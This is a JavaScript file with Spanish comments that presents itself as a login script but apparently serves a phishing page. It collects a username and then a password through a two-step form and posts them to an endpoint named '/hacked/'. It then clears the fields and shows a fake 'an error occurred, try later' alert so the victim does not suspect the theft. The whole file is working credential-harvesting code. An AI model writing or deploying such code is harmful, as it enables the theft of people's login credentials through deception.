/**
* En este archivo encontrara la funcionalidad del loguin
*/
const userData = document.querySelectorAll('.user_data') // Selecciona los divs que contiene los inputs
const txtUser = document.querySelector('#uid_input');  // Selecciona el Input de usuario
const btnNext = document.querySelector('#uid_next');  // Selecciona el boton siguiente
const txtPass = document.querySelector('#pass_input'); // Selecciona el Input de password
const btnSend = document.querySelector('#send_data');  // Selecciona el boton continuar
const data = {};  // crea la data a enviar


const inputValidate = valor => {
    // Valida que se introduzca informacion en el los inputs
    return valor !== '';


}

const cleanData = () => {
    // Limpia los datos de los inputs cuando se ha completado el envio
    txtUser.value = '';
    txtPass.value = '';
}

btnNext.onclick = () => {
    // Se ejecuta al dar clic sobre el boton siguiente
    if ( inputValidate(txtUser.value)) {
        userData[0].classList.add('d-none')
        userData[1].classList.remove('d-none')

        data.username = txtUser.value;
    }
}

btnSend.onclick = () => {
    // Se ejecuta al dar clic en el boton continuar
    if ( inputValidate(txtPass.value)) {
        data.password = txtPass.value;
        console.log('entra')

        axios.post('/hacked/', data)
            .then(
                res => {
                    cleanData()
                    alert('Ha ocurrido un error, por favor intente mas tarde')
                }
            )
            .catch(err => console.log(err))
    }
}
